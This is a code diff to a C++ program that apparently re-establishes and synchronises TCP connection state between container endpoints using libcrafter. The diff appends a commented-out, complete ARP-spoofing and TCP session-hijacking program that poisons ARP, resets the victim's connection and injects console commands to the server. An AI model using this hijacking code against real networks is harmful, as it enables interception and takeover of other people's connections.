@@ -488,6 +488,8 @@ int main() {
                         tcp_v_to_s =
                             new TCPConnection(server_ip, client_ip, op_data->addr[0][1].port, op_data->addr[0][0].port,
                                               MVVM_SOCK_INTERFACE, TCPConnection::TIME_WAIT);
+                        tcp_v_to_s->Sync();
+
                         // block the connection
                         start_block(client_ip, server_ip, op_data->addr[0][1].port, op_data->addr[0][0].port);
                     }
@@ -509,15 +511,18 @@ int main() {
                 // stop keep_alive
                 if (op_data->is_tcp) {
                     backend_thread.pop_back();
+                    tcp_v_to_s =
+                        new TCPConnection(server_ip, client_ip, op_data->addr[0][1].port, op_data->addr[0][0].port,
+                                          MVVM_SOCK_INTERFACE, TCPConnection::ESTABLISHED);
                     tcp_s_to_v =
                         new TCPConnection(client_ip, server_ip, op_data->addr[0][0].port, op_data->addr[0][1].port,
                                           MVVM_SOCK_INTERFACE, TCPConnection::ESTABLISHED);
                     /* Both connection are already established... */
                     tcp_v_to_s->Sync();
                     tcp_s_to_v->Sync();
+
                     // stop SYN
                     LOGV(ERROR) << "Connections synchronized ";
-                    
                 }
                 sleep(1);
                 break;
@@ -525,3 +530,85 @@ int main() {
         }
     }
 }
+// #include <iostream>
+// #include <string>
+// #include <crafter.h>
+// #include <crafter/Utils/TCPConnection.h>
+
+// /* Collapse namespaces */
+// using namespace std;
+// using namespace Crafter;
+
+// /* Source port that we have to find out */
+// short_word srcport = 0;
+
+// int main() {
+
+// 	/* Set the interface */
+// 	string iface = "docker0";
+
+// 	ip_forward();
+
+// 	/* Set connection data */
+// 	string dst_ip = "172.17.0.3"; // <-- Destination IP
+// 	string src_ip = "172.17.0.2"; // <-- Spoof IP
+// 	short_word dstport = 12346;     // <-- We know the spoofed IP connects to this port
+//     short_word srcport = 15772;
+
+// 	/* Begin the spoofing */
+// 	ARPContext* arp_context = ARPSpoofingReply(dst_ip,src_ip,iface);
+
+// 	/* Print some info */
+// 	PrintARPContext(*arp_context);
+
+// 	cout << "[@] Detected a source port: " << srcport << endl;
+
+// 	/* ------------------------------------- */
+
+// 	/* TCP connection victim to server */
+// 	TCPConnection tcp_v_to_s(src_ip,dst_ip,srcport,dstport,iface,TCPConnection::ESTABLISHED);
+// 	/* TCP connection server to victim */
+// 	TCPConnection tcp_s_to_v(dst_ip,src_ip,dstport,srcport,iface,TCPConnection::ESTABLISHED);
+// 	/* Both connection are already established... */
+
+// 	/* [+] Synchronize the ACK and SEQ numbers
+// 	 * This will block the program until some TCP packets from the spoofed connection
+// 	 * pass through your computer...
+// 	 */
+// 	tcp_v_to_s.Sync();
+// 	tcp_s_to_v.Sync();
+
+// 	cout << "[@] Connections synchronized " << endl;
+
+// 	/* Give all this a second... */
+// 	sleep(1);
+
+// 	/* Start blocking the traffic of the spoofed connection */
+// 	start_block(dst_ip,src_ip,dstport,srcport);
+
+// 	/* Reset the connection to the victim */
+// 	tcp_s_to_v.Reset();
+
+// 	/* Now we communicate with the server from our console... */
+// 	string line = "";
+// 	string centinel = "QUITCONSOLE";
+// 	while(line != centinel) {
+// 		/* Get a line from standard input */
+// 		getline(cin,line);
+// 		/* Send to the destination */
+// 		if(line != centinel) {
+// 			line += "\n";
+// 			tcp_v_to_s.Send(line.c_str());
+// 		}
+// 	}
+
+// 	/* Close the spoofed connection with the server after we send our commands */
+// 	tcp_v_to_s.Close();
+
+// 	/* Clear everything */
+// 	clear_block(dst_ip,src_ip,dstport,srcport);
+//     clear_forward();
+// 	CleanARPContext(arp_context);
+
+// 	return 0;
+// }
